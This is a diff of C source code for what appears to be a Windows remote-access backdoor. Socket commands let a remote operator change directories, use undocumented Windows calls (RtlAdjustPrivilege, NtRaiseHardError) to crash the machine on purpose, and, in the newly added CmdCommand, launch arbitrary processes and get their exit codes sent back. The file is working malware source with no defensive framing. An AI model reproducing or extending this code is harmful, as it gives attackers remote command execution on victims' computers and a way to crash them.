@@ -1,6 +1,7 @@
 #include <string.h>
 #include "Commands.h"
 #include "SocketUtil.h"
+#include "Utils.h"
 
 //undocumented API
 //declarations
@@ -8,7 +9,9 @@ NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
 NTSTATUS NTAPI NtRaiseHardError(NTSTATUS, ULONG, ULONG, 
 								PULONG_PTR, ULONG, PULONG);
 
-
+//
+//Commands
+//
 BOOL HelpCommand(SOCKET* sck) {
 	char buf[BUFSIZE];
 	ZeroMemory(buf,BUFSIZE);
@@ -29,7 +32,7 @@ BOOL HelpCommand(SOCKET* sck) {
 }
 
 BOOL HelloCommand(SOCKET* sck) {
-	WriteConnection(sck, "i am still here dumbass...\n");
+	WriteConnection(sck, "i am still here dumbass...");
 
 	return TRUE;
 }
@@ -44,7 +47,7 @@ BOOL ReplyCommand(SOCKET* sck, PSTR str) {
 }
 
 BOOL NtRaiseHardErrorCommand(SOCKET* sck) {
-	WriteConnection(sck, "Goodbye my friend...\n");
+	WriteConnection(sck, "Goodbye my friend...");
 
     BOOLEAN bl;
 	ULONG response;
@@ -62,7 +65,7 @@ BOOL ChangeDirectoryCommand(SOCKET* sck, PSTR str) {
 		return FALSE;
 
 	if(!SetCurrentDirectory(str)) 
-		WriteConnection(sck, "Could not change working directory\n");
+		WriteConnection(sck, "Could not change working directory");
 
 	return TRUE;
 }
@@ -76,3 +79,60 @@ BOOL GetCwdCommand(SOCKET* sck) {
 	
 	return TRUE;
 }
+
+BOOL CmdCommand(SOCKET* sck, PSTR str) {
+	if(!strlen(str))
+		return FALSE;
+
+	DWORD timeout;
+	char* commandBeginningPtr = GetCommandTimeout(str, &timeout);
+	if(commandBeginningPtr == NULL) {
+		WriteConnection(sck, "usage: cmd <timeout_ms_dec> [command...]");
+		return FALSE;
+	}
+
+	SPAWNED_PROCESS_INFO process = SpawnNewProcess(commandBeginningPtr);
+	
+	if(process.isOk == FALSE) {
+		int err = GetLastError();
+		WriteConnection(sck, "Could not start new process");
+		LPSTR message = ErrorString(err);
+		WriteConnection(sck, message);
+		LocalFree(message);
+	} else {
+		char msg[BUFSIZE];
+		ZeroMemory(msg, BUFSIZE);
+		snprintf(msg, BUFSIZE, "New process: %d\n", process.info.dwProcessId);
+		WriteConnection(sck, msg);
+
+		DWORD reasonCode = WaitForSingleObject(process.info.hProcess, timeout);
+		
+		char reason[51];
+		ZeroMemory(reason, 51);
+		memcpy(reason, "terminated, reason: ", 20);
+		
+		if(reasonCode == WAIT_FAILED)
+			memcpy(reason + 20, "wait failure", 12);
+		else if(reasonCode == WAIT_OBJECT_0)
+			memcpy(reason + 20, "normal termination", 18);
+		else if(reasonCode == WAIT_TIMEOUT)
+			memcpy(reason + 20, "timeout reached", 15);
+		else
+			memcpy(reason + 20, "unknown", 7);
+
+		DWORD exitCode = 0x0;
+		GetExitCodeProcess(process.info.hProcess, &exitCode); 
+		snprintf(reason + strlen(reason), 12, ": 0x%x", exitCode);
+
+		WriteConnection(sck, reason);
+
+		CloseHandle(process.stdOut);
+		CloseHandle(process.stdIn);
+		CloseHandle(process.stdErr);
+		CloseHandle(process.info.hThread);
+		CloseHandle(process.info.hProcess);
+	}
+
+	return TRUE;
+}
+
